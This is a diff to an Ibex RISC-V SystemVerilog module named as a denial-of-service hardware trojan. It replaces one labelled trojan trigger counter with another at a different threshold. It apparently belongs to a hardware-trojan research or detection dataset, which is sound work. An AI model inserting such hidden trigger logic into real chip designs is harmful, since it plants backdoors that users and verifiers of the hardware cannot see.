@@ -30,24 +30,6 @@ module ibex_dummy_instr_trojan_DoS import ibex_pkg::*; #(
   output logic [31:0] dummy_instr_data_o
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 12017;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (dummy_instr_en_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   localparam int unsigned TIMEOUT_CNT_W = 5;
   localparam int unsigned OP_W          = 5;
 
@@ -65,6 +47,23 @@ module ibex_dummy_instr_trojan_DoS import ibex_pkg::*; #(
     logic [TIMEOUT_CNT_W-1:0] cnt;
   } lfsr_data_t;
   localparam int unsigned LFSR_OUT_W = $bits(lfsr_data_t);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=17637)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 17637;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (dummy_instr_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
   lfsr_data_t               lfsr_data;
   logic [TIMEOUT_CNT_W-1:0] dummy_cnt_incr, dummy_cnt_threshold;
